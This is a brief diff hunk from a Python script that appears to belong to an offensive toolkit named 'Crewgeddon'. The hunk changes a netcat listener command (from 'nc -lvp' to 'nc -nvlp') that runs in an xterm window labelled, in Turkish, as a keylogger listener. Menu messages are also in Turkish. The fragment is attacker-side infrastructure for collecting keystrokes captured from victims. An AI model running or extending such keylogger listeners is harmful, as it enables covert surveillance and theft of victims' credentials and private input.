@@ -256,7 +256,7 @@ while True:
                 "xterm",
                 "-T", "Crewgeddon - KeyLogger Dinleyicisi (Desktop)",
                 "-hold",
-                "-e", f"nc -lvp {port}"
+                "-e", f"nc -nvlp {port}"
             ])
         else:
             print(Fore.RED + "[CREWGEDDON]:" + Fore.WHITE + " Geçersiz işlem belirttiniz.")
